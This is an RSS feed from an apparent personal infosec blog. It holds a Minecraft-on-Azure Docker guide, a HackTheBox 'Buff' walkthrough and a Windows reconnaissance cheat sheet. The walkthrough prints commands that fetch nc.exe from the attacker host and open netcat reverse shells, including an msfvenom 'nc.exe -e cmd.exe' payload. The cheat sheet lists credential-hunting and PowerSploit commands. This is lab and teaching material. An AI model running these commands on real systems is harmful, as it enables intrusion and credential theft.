<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Nathan Eberhardt</title>
	<atom:link href="https://nathaneberhardt.com/feed/" rel="self" type="application/rss+xml" />
	<link>https://nathaneberhardt.com</link>
	<description>InfoSec Blogs</description>
	<lastBuildDate>Sun, 17 Jan 2021 09:02:16 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.5.5</generator>

<image>
	<url>https://nathaneberhardt.com/wp-content/uploads/2020/09/cropped-item-32x32.jpg</url>
	<title>Nathan Eberhardt</title>
	<link>https://nathaneberhardt.com</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>HackTheBox &#8211; Worker</title>
		<link>https://nathaneberhardt.com/2021/01/17/hackthebox-worker/</link>
					<comments>https://nathaneberhardt.com/2021/01/17/hackthebox-worker/#respond</comments>
		
		<dc:creator><![CDATA[Nathan]]></dc:creator>
		<pubDate>Sun, 17 Jan 2021 09:02:16 +0000</pubDate>
				<category><![CDATA[Guides]]></category>
		<guid isPermaLink="false">https://nathaneberhardt.com/?p=452</guid>

					<description><![CDATA[[Writeup will become visible after Worker is retired]]]></description>
										<content:encoded><![CDATA[
<p>[Writeup will become visible after Worker is retired]</p>
]]></content:encoded>
					
					<wfw:commentRss>https://nathaneberhardt.com/2021/01/17/hackthebox-worker/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Setting up a Minecraft Docker Server on Ubuntu 18.04 with Azure</title>
		<link>https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/</link>
					<comments>https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/#respond</comments>
		
		<dc:creator><![CDATA[Nathan]]></dc:creator>
		<pubDate>Sat, 07 Nov 2020 02:15:53 +0000</pubDate>
				<category><![CDATA[Guides]]></category>
		<guid isPermaLink="false">https://nathaneberhardt.com/?p=382</guid>

					<description><![CDATA[A project I worked on recently was to create a Minecraft server as cheap and efficiently as possible. If you do a quick google search, you&#8217;ll find that there are endless options when it comes to hosting Minecraft servers. However, many of the external hosting providers you will find are either very expensive or are...]]></description>
										<content:encoded><![CDATA[
<p>A project I worked on recently was to create a Minecraft server as cheap and efficiently as possible. If you do a quick google search, you&#8217;ll find that there are endless options when it comes to hosting Minecraft servers. However, many of the external hosting providers you will find are either very expensive or are low performance, so most people are stuck with hosting the server on their own personal computer via port forwarding. One option I considered for server hosting was using a dedicated VPS. An advantage to using a VPS is that you have full customization over the hardware and system components for your virtual machine. While researching cloud services, I found out on Microsoft&#8217;s website that they offered 100$ free credit for VPS services for students. </p>



<figure class="wp-block-image size-large"><img loading="lazy" width="690" height="226" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/2.png" alt="" class="wp-image-383" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/2.png 690w, https://nathaneberhardt.com/wp-content/uploads/2020/11/2-300x98.png 300w" sizes="(max-width: 690px) 100vw, 690px" /></figure>



<p>In addition, other websites like Digital Ocean also offer free credit for anyone with an .edu email. I thought that this would be a fun and interesting project to see how powerful I could make my server for the cheapest cost. I also ended up deploying the server in a docker container for easier management, and to separate it from my other projects.</p>



<h2 class="has-medium-font-size">Creating the VM</h2>



<p>To maximize resources and cost, choosing a Linux distro as the host OS is the way to go. I decided to run the server on Ubuntu 18.04 Server.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="883" height="827" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/5.png" alt="" class="wp-image-385" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/5.png 883w, https://nathaneberhardt.com/wp-content/uploads/2020/11/5-300x281.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/5-768x719.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>



<p>The best deal I could get for 4gb of RAM was 30$/month. Setting up the Virtual Machine was surprisingly easy and painless, and I&#8217;ll probably be using this VM for future projects/blogs.</p>



<p>The next thing you need to consider is how you are going to connect/transfer files to your VPS after its been setup. For Windows Server, you would use RDP on port 3389, but in my case I&#8217;m using SSH with password authentication:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="478" height="387" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/7.png" alt="" class="wp-image-387" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/7.png 478w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-300x243.png 300w" sizes="(max-width: 478px) 100vw, 478px" /></figure>



<p>If you already have the core files for your MC Server already installed, you can transfer the files to the vm with a command such as scp:</p>


<pre class="brush: bash; title: ; notranslate">
scp file user@[host/ip]:directory/targetfile
</pre>


<p>I also needed to download a couple of extra files, which you can perform with curl:</p>


<pre class="brush: bash; title: ; notranslate">
curl [URL/download link]
</pre>


<p>The next set of tasks I needed to accomplish was</p>



<ol><li>Allow an inbound networking rule to allow port 25565 on TCP and UDP</li><li>Set the server up in a docker container</li></ol>



<p>Exposing port 25565 on the VPS is a fairly simple task. You can access networking rules in the &#8220;Network Security Group&#8221; settings on the Azure Panel. </p>



<figure class="wp-block-image size-large is-resized"><img loading="lazy" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1024x450.png" alt="" class="wp-image-388" width="853" height="374" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1024x450.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12-300x132.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12-768x337.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1536x674.png 1536w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12.png 1920w" sizes="(max-width: 853px) 100vw, 853px" /></figure>



<p>By default, there will be an Implicit deny ACL as well as an ACL to allow SSH/RDP connections. Go ahead and add a new Inbound rule and add port 25565 as shown:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="587" height="845" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/13.png" alt="" class="wp-image-389" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/13.png 587w, https://nathaneberhardt.com/wp-content/uploads/2020/11/13-208x300.png 208w" sizes="(max-width: 587px) 100vw, 587px" /></figure>



<h2 class="has-medium-font-size">Setting up the server configurations</h2>



<p>After you complete this step, you can move on to the final steps for your server. For a fresh Ubuntu install, you will want to update your repositories, and install Java JRE 8.</p>


<pre class="brush: bash; title: ; notranslate">
sudo apt-get update
</pre>

<pre class="brush: bash; title: ; notranslate">
sudo apt install openjdk-8-jre
</pre>


<p>Once you&#8217;ve installed/transfered the files for your Minecraft server, you need to update the server.jar file with the proper server configurations and version number:</p>


<pre class="brush: bash; title: ; notranslate">
java -Xmx2048M -Xms1024M -jar server[VERSION].jar nogui 
</pre>


<p>For the java command listed above, -Xmx specifies the maximum RAM usage for the server, and -Xms specifies the minimum RAM usage. the nogui parameter specifies that we are not using a gui. We also need to accept the eula.txt, so nano/vim into the file and set it to true before you turn the server on.</p>



<p>And that&#8217;s it! your free Minecraft server should be fully functional at this point, with minimal lag. I even tested this process with a modpack server and it worked perfectly. Optionally, you can run your Minecraft server in a docker container, which will treat the server as a service rather than a java file. If you want, you can follow the steps below to setup Docker</p>



<p>I&#8217;m using Docker&#8217;s documentation for <a href="https://docs.docker.com/engine/install/ubuntu/">installing the Docker Engine on Ubuntu.</a> I&#8217;m not going to go into much detail with the commands, and you should probably follow the docs for a better explanation. However, I&#8217;ll be showing what I used in order to set this up properly.</p>



<h2 class="has-medium-font-size">Deploying server in a docker container</h2>



<p>Install packages to allow apt to use a repository over HTTPS:</p>


<pre class="brush: bash; title: ; notranslate">
sudo apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    software-properties-common
</pre>


<p>Add Docker&#8217;s official GPG key:</p>


<pre class="brush: bash; title: ; notranslate">
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
</pre>


<p>Verify that you now have the key with the fingerprint:</p>


<pre class="brush: bash; title: ; notranslate">
sudo apt-key fingerprint 0EBFCD88
</pre>


<p>Setup a stable repository for Ubuntu amd64</p>


<pre class="brush: bash; title: ; notranslate">
sudo add-apt-repository \
   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable&quot;
</pre>


<p>Install Docker Engine</p>


<pre class="brush: bash; title: ; notranslate">
sudo apt-get install docker-ce docker-ce-cli containerd.io
</pre>


<p>After we get those prerequisites out of the way, we can configure the Docker Image.</p>


<pre class="brush: bash; title: ; notranslate">
nano Dockerfile
</pre>


<p>Paste the following:</p>


<pre class="brush: bash; title: ; notranslate">
FROM java:8
WORKDIR /app/
ADD . /app/
CMD java -Xmx2048M -Xms1024M -jar server[VERSION].jar nogui
</pre>


<p>Build the Docker image</p>


<pre class="brush: bash; title: ; notranslate">
sudo docker build . --tag minecraftserver
</pre>


<p>Create a Docker volume</p>


<pre class="brush: bash; title: ; notranslate">
sudo docker volume create servervolume
</pre>


<p>Run the docker image</p>


<pre class="brush: bash; title: ; notranslate">
sudo docker run -p 25565:25565 --mount source=servervolume,target=/app minecraftserver

</pre>


<p>You&#8217;re Minecraft server is now a successfully running service!</p>
]]></content:encoded>
					
					<wfw:commentRss>https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>HackTheBox &#8211; Buff</title>
		<link>https://nathaneberhardt.com/2020/10/10/hackthebox-buff/</link>
					<comments>https://nathaneberhardt.com/2020/10/10/hackthebox-buff/#respond</comments>
		
		<dc:creator><![CDATA[Nathan]]></dc:creator>
		<pubDate>Sat, 10 Oct 2020 19:22:46 +0000</pubDate>
				<category><![CDATA[HackTheBox]]></category>
		<guid isPermaLink="false">https://nathaneberhardt.com/?p=227</guid>

					<description><![CDATA[This is my first HackTheBox writeup, and I decided to write up on the &#8220;Buff&#8221; box that I did last month. It is a Windows OS machine with a difficulty of &#8220;Easy&#8221;, so it&#8217;s a good starting box for this series. User Flag: As always we want to start with an nmap scan to check...]]></description>
										<content:encoded><![CDATA[
<figure class="wp-block-image size-large"><img loading="lazy" width="708" height="438" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png" alt="" class="wp-image-396" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png 708w, https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb-300x186.png 300w" sizes="(max-width: 708px) 100vw, 708px" /></figure>



<p>This is my first HackTheBox writeup, and I decided to write up on the &#8220;Buff&#8221; box that I did last month. It is a Windows OS machine with a difficulty of &#8220;Easy&#8221;, so it&#8217;s a good starting box for this series.</p>



<h2>User Flag:</h2>



<p>As always we want to start with an nmap scan to check for open ports/services. The &#8220;sV&#8221; flag is to scan for service versions: </p>



<figure class="wp-block-image size-large"><img loading="lazy" width="600" height="88" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/1.png" alt="" class="wp-image-428" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/1.png 600w, https://nathaneberhardt.com/wp-content/uploads/2020/11/1-300x44.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></figure>



<p>The nmap scan indicates that the host may be blocking ping probes, so we add the &#8220;-Pn&#8221; flag to the command:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="597" height="134" src="https://nathaneberhardt.com/wp-content/uploads/2020/10/2.png" alt="" class="wp-image-399" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/10/2.png 597w, https://nathaneberhardt.com/wp-content/uploads/2020/10/2-300x67.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></figure>



<p>We see that port 8080 is open and is running an Apache web server. We can go ahead and visit that site at 10.10.10.198:8080:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="692" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png" alt="" class="wp-image-429" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3-300x203.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3-768x519.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3.png 1069w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Visiting the home page, it looks like a simple fitness website. The first set of actions I take when I discover a web site:</p>



<ol><li>Check all of the pages and their page soure&#8217;s for anything interesting</li><li>Run a dirbuster scan to find any hidden directories.</li><li>Test XSS and SQLi attacks on any input fields we find.</li><li>Capture the requests with BurpSuite to see if we can extract any data or manipulate the requests for a possible exploit. </li></ol>



<p>The login fields seemed to be properly sanitized, and the hidden files/directories didn&#8217;t lead me anywhere</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="479" height="359" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png" alt="" class="wp-image-431" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png 479w, https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1-300x225.png 300w" sizes="(max-width: 479px) 100vw, 479px" /></figure>



<p>While browsing the other pages of the site, I found an empty Contact page:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="362" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png" alt="" class="wp-image-434" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-300x106.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-768x272.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2.png 1068w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Definitely a suspicious find, and the only text on the page was &#8220;Made using Gym Management Software 1.0.&#8221; After a quick search on this on ExploitDB I found this:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="626" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png" alt="" class="wp-image-435" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9-300x183.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9-768x469.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9.png 1064w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>According to the exploit, any website using the Gym Management System 1.0 could be vulnerable to unauthenticated remote code execution. It uses python 2, so you may have to run the exploit in a virtual environment if you&#8217;re having problems with python 3.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="917" height="442" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/10.png" alt="" class="wp-image-436" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/10.png 917w, https://nathaneberhardt.com/wp-content/uploads/2020/11/10-300x145.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/10-768x370.png 768w" sizes="(max-width: 917px) 100vw, 917px" /></figure>



<p>The latest version of kali already has this exploit in the exploitdb directory, so all you have to do is copy it to your working directory and run it!</p>


<pre class="brush: bash; title: ; notranslate">
$ cp /usr/share/exploitdb/exploits/php/webapps/48506.py/ .
</pre>

<pre class="brush: bash; title: ; notranslate">
$ python 48506.py http://10.10.10.198:8080/
</pre>


<figure class="wp-block-image size-large"><img loading="lazy" width="408" height="114" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png" alt="" class="wp-image-438" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png 408w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1-300x84.png 300w" sizes="(max-width: 408px) 100vw, 408px" /></figure>



<p>And just like that we have a web shell! The next things I always do when trying to escalate my privileges on a windows machine is to upload the &#8220;nc.exe&#8221; and &#8220;plink.exe&#8221; binaries found in the &#8220;windows-binaries&#8221; directory on your kali box. nc.exe is netcat which allows you to upgrade to a better shell, and plink is used to forward ports not directly reachable from outside of the machine.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="450" height="118" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png" alt="" class="wp-image-439" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png 450w, https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1-300x79.png 300w" sizes="(max-width: 450px) 100vw, 450px" /></figure>



<p>Now we just need a way to get those binaries onto the victim machine. A really fast way to get this done is to setup a python simpleHTTPServer on your host that holds all of your binaries, and then download those binaries onto the victim machine with a web request command:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="613" height="148" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/19.png" alt="" class="wp-image-444" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/19.png 613w, https://nathaneberhardt.com/wp-content/uploads/2020/11/19-300x72.png 300w" sizes="(max-width: 613px) 100vw, 613px" /></figure>



<p>With the webshell we have just created, we can perform an Invoke-WebRequest command to download the binaries onto the victim machine:</p>


<pre class="brush: bash; title: ; notranslate">
C:\xampp\htdocs\gym\upload&gt; Invoke-WebRequest -Uri [attacking box ip]/nc.exe -OutFile &quot;nc.exe&quot;
</pre>


<p>With netcat successfully downloaded onto the victim machine, we can run a listening netcat connection on our kali box to create a reverse shell:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="507" height="80" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/15.png" alt="" class="wp-image-441" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/15.png 507w, https://nathaneberhardt.com/wp-content/uploads/2020/11/15-300x47.png 300w" sizes="(max-width: 507px) 100vw, 507px" /></figure>



<p>Then, we run the nc.exe binary to connect back to our host machine with the nc.exe binary we just uploaded</p>


<pre class="brush: bash; title: ; notranslate">
C:\xampp\htdocs\gym\upload&gt; nc [attacking box ip]:4444
</pre>


<p>If all done correctly, you should have a new shell, and should be able to use normal cmd/powershell commands. While traversing the system directories, I found the user shaun and the user Administrator. the access to Administrator was denied, but I could cd into shaun&#8217;s directory; the user flag is on his Desktop. As for the Administrator flag, we will have to dive deeper into the system to try to find something to exploit.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="544" height="546" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/23.png" alt="" class="wp-image-445" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/23.png 544w, https://nathaneberhardt.com/wp-content/uploads/2020/11/23-300x300.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/23-150x150.png 150w" sizes="(max-width: 544px) 100vw, 544px" /></figure>



<h2>Administrator/Root Flag:</h2>



<p>In the Download folder, there is an exe file named Cloudme1.11.2.exe that is running on a local port on the system. With a quick google search, I found that this file is vulnerable to Buffer Overflow. This is where the plink.exe comes in: we will forward the localport using cloudme to our host machine in order to exploit it with Buffer Overflow. Heres the metasploit payload I used:</p>


<pre class="brush: bash; title: ; notranslate">
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe [attacking host ip]' -b '\x00\x0a\x0d'
</pre>


<p>After running that in a compiled executable, you will be able to connect to the victim machines as Administrator! Just traverse into Desktop folder and grab your flag!</p>
]]></content:encoded>
					
					<wfw:commentRss>https://nathaneberhardt.com/2020/10/10/hackthebox-buff/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Windows Reconnaissance with CMD and PowerShell</title>
		<link>https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/</link>
					<comments>https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/#respond</comments>
		
		<dc:creator><![CDATA[Nathan]]></dc:creator>
		<pubDate>Thu, 24 Sep 2020 20:07:26 +0000</pubDate>
				<category><![CDATA[Guides]]></category>
		<guid isPermaLink="false">https://nathaneberhardt.com/?p=14</guid>

					<description><![CDATA[This guide covers the fundamentals of windows enumeration, system footprinting and other types of reconnaissance, as well as some useful cmd/powershell cmdlets I’ve picked up while competing in CCDC. For both blue team and red team, it&#8217;s critical to know the ins and outs of your systems to ensure optimal security of your network. The...]]></description>
										<content:encoded><![CDATA[
<p>This guide covers the fundamentals of windows enumeration, system footprinting and other types of reconnaissance, as well as some useful cmd/powershell cmdlets I’ve picked up while competing in CCDC. For both blue team and red team, it&#8217;s critical to know the ins and outs of your systems to ensure optimal security of your network. </p>



<span id="more-14"></span>



<p>The more information you can collect about a system, the greater the chance of it becoming compromised. This guide will be useful for both the initial recon of a Windows system, as well as for post exploitation (especially if you only have access to a cli). I&#8217;ll be adding more to this guide as I learn more about Windows Server/workstations. In future blogs, I’ll be showcasing how you can use this gathered information to escalate privileges in the Domain.</p>



<h2>Starting off</h2>



<hr class="wp-block-separator has-text-color has-background has-black-background-color has-black-color is-style-wide"/>


<pre class="brush: plain; title: ; notranslate">
Systeminfo 
</pre>


<p>Displays detailed information and configurations of the computer and operating system.</p>


<pre class="brush: plain; title: ; notranslate">
Wmic
</pre>


<p>The wmic command provides a command line interface for Windows Instrumentation. Wmic will also not be logged by default audit policies and event logs. There’s a lot of info you can extract with this command, and some cool things you can do with it as well. Here are a few examples:</p>



<div class="wp-block-group wmic-group has-white-background-color has-background"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
wmic /output:c:os.html os get /format:hform
</pre>


<p>Generates an OS/system report in HTML</p>


<pre class="brush: plain; title: ; notranslate">
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
</pre>


<p>Displays Hardrive info</p>


<pre class="brush: plain; title: ; notranslate">
wmic STARTUP GET Caption, Command, User
</pre>


<p>Finds programs/scripts that start on boot</p>


<pre class="brush: plain; title: ; notranslate">
wmic [useraccount/group/services] list
</pre>


<p>&nbsp;Gets info about users/groups/services</p>


<pre class="brush: plain; title: ; notranslate">
Wmic qfe
</pre>


<p>Gets a list of updates on the windows machine</p>
</div></div>


<pre class="brush: plain; title: ; notranslate">
Net
</pre>


<p>The net command manages many aspects of the network settings on a windows machine. Some uses:</p>



<div class="wp-block-group net-groupcss has-white-background-color has-background"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
Net [user/group]
</pre>


<p>Lists all local and domain users/groups.</p>


<pre class="brush: plain; title: ; notranslate">
Net file
</pre>


<p>Shows a list of open files on a server.</p>


<pre class="brush: plain; title: ; notranslate">
Net share
</pre>


<p>Lists/manages shared resources on the machine</p>


<pre class="brush: plain; title: ; notranslate">
Net start
</pre>


<p>Displays running services.</p>
</div></div>


<pre class="brush: plain; title: ; notranslate">
qwinsta
</pre>


<p>Displays any users currently logged on. The “query session” command performs the same task.</p>


<pre class="brush: plain; title: ; notranslate">
Cmdkey /list
</pre>


<p>Displays a list of all user names and credentials that are stored in credential manager.<a href="https://nathaneberhardt.com/wp-admin/edit.php?post_type=post"></a></p>


<pre class="brush: plain; title: ; notranslate">
Icacls [path]
</pre>


<div class="wp-block-group icacls-group"><div class="wp-block-group__inner-container">
<p>Gets permissions of the specified directory/file. Permissions are represented as uppercase letters in the output. Here is a quick overview of some of the permissions you will see:</p>



<p><strong>Simple rights:</strong></p>



<ul><li><strong>F</strong> (full access)</li><li><strong>M</strong> (modify access)</li><li><strong>RX</strong> (read and execute access)</li><li><strong>R</strong> (read-only access)</li><li><strong>W</strong> (write-only access)</li></ul>



<p><strong>Inherited Rights (apply only to directories):</strong></p>



<ul><li><strong>(OI)</strong>: object inherit</li><li><strong>(CI)</strong>: container inherit</li><li><strong>(IO)</strong>: inherit only</li><li><strong>(NP)</strong>: do not propagate inherit</li><li><strong>(I)</strong>: permission inherited from parent container</li></ul>



<p>There are a list of other specific rights you can view on the microsoft docs. <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN" target="_blank">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN</a></p>



<p>The output can be verbose, so you can pipe the command into filters. Example:</p>


<pre class="brush: plain; title: ; notranslate">
icacls &quot;C:\Users\*&quot; | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;
</pre>


<p>This narrows down your search by piping the command into &#8220;findstr&#8221;, which filters the output to &#8220;Full&#8221; Permissions and the &#8220;Everyone&#8221; Group.</p>
</div></div>


<pre class="brush: plain; title: ; notranslate">
schtasks /query
</pre>


<p>Looks for any scheduled tasks running on the machine.</p>


<pre class="brush: plain; title: ; notranslate">
netsh
</pre>


<div class="wp-block-group netsh-group"><div class="wp-block-group__inner-container">
<p>Network shell (netsh) is a command-line utility that allows you to configure and display the status of various network communications. I&#8217;ll only be going over a few examples of what you can do with this tool.</p>


<pre class="brush: plain; title: ; notranslate">
netsh interface ip show config
</pre>


<p>Displays configurations for your network interfaces.</p>


<pre class="brush: plain; title: ; notranslate">
netsh advfirewall firewall export [path]
</pre>


<p>Grabs firewall settings on the machine and exports to a file.</p>
</div></div>


<pre class="brush: plain; title: ; notranslate">
reg query [key]
</pre>


<p>the reg command is used to display values of a registry key. Examples:</p>



<div class="wp-block-group get-adcomputer"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
reg query HKEY_LOCAL_MACHINE\SOFTWARE
</pre>


<p>Returns installed software.</p>
</div></div>



<div class="wp-block-group get-adcomputer"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
</pre>


<p>You can sometimes find default credentials in User Autologon</p>
</div></div>


<pre class="brush: plain; title: ; notranslate">
Nbtstat -a [IP]
</pre>


<p>Finds the NetBIOS name of an endpoint with the specified ip address.</p>


<pre class="brush: plain; title: ; notranslate">
netstat -anob
</pre>


<p>Netstat displays connections for the current machine. You want to look for any listening connections that can be connected to remotely. Some of the ports may not be accessible externally, but portforwarding them can make them accessible.</p>



<h2>Domain Recon with PowerShell</h2>



<hr class="wp-block-separator is-style-wide"/>



<p>There is a lot of useful domain information you can collect with powershell cmdlets.</p>


<pre class="brush: plain; title: ; notranslate">
Get-ADDomain [Server]
</pre>


<p>Gets info about the domain.</p>


<pre class="brush: plain; title: ; notranslate">
Get-ADGroup [Group]
</pre>


<p>Gets info about the domain groups or specified group.</p>


<pre class="brush: plain; title: ; notranslate">
Get-ADGroupMember [Group]
</pre>


<p>Gets info about the members of a Domain Group. Example:</p>



<div class="wp-block-group get-adcomputer"><div class="wp-block-group__inner-container">
<div class="wp-block-group get-adcomputer"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
Get-ADGroupMember &quot;Domain Admins&quot;
</pre>


<p>Get list of members in Domain Admins group.</p>
</div></div>
</div></div>


<pre class="brush: plain; title: ; notranslate">
Get-ADComputer [Computer]
</pre>


<p>Get info about domain computers or a specified computer. Example:</p>



<div class="wp-block-group termsrv-get"><div class="wp-block-group__inner-container">
<div class="wp-block-group get-adcomputer"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
 Get-ADComputer -Filter {ServicePrincipalName -like “*TERMSRV*”}
</pre>


<p>Find all computers running RDP service</p>
</div></div>
</div></div>


<pre class="brush: plain; title: ; notranslate">
Get-ADUser
</pre>


<p>Get info about domain users or a specified Domain user. Example:</p>



<div class="wp-block-group spn-aduser"><div class="wp-block-group__inner-container">
<div class="wp-block-group spn-aduser"><div class="wp-block-group__inner-container"><pre class="brush: plain; title: ; notranslate">
Get-ADUser -Filter {ServicePrincipalName -like “*”} 
</pre>


<p>Find Service Accounts by filtering by SPN.</p>
</div></div>
</div></div>


<pre class="brush: plain; title: ; notranslate">
Get-GPO
</pre>


<p>Gets info about Group Policy Objects on the domain</p>



<p>To take this a step further, you can use a PowerShell platform called powersploit, which is used for privilege escalation and reconnaissance of a Domain Controller. Here are some powersploit cmdlets you can use for recon.</p>


<pre class="brush: plain; title: ; notranslate">
Get-DomainDNSZone
</pre>


<p>Enumerates the Active Directory DNS zones for a given domain</p>


<pre class="brush: plain; title: ; notranslate">
Get-NetGPOGroup
</pre>


<p>Finds a list of accounts with elevated privileges by scanning GPOs on the Domain.&nbsp;</p>


<pre class="brush: plain; title: ; notranslate">
Invoke-UserHunter
</pre>


<p>Finds machines on the local domain where specified users are logged into, and can check if the current user has local admin access to the machines.</p>


<pre class="brush: plain; title: ; notranslate">
Invoke-FileFinder
</pre>


<p>Finds sensitive files on hosts by searching shared folders.</p>


<pre class="brush: plain; title: ; notranslate">
Find-InterestingFile
</pre>


<p>Searches a local or remote path for files with specific terms in the name.</p>


<pre class="brush: plain; title: ; notranslate">
Invoke-UserEventHunter
</pre>


<p>&nbsp;Hunts for user logon events in domain controller event logs.</p>



<p>For more details on powersploit: <a href="https://powersploit.readthedocs.io/en/stable/Recon/README/" target="_blank" rel="noreferrer noopener">https://powersploit.readthedocs.io/en/stable/Recon/README/</a></p>
]]></content:encoded>
					
					<wfw:commentRss>https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>History of Minecraft Survival Games and battle royale</title>
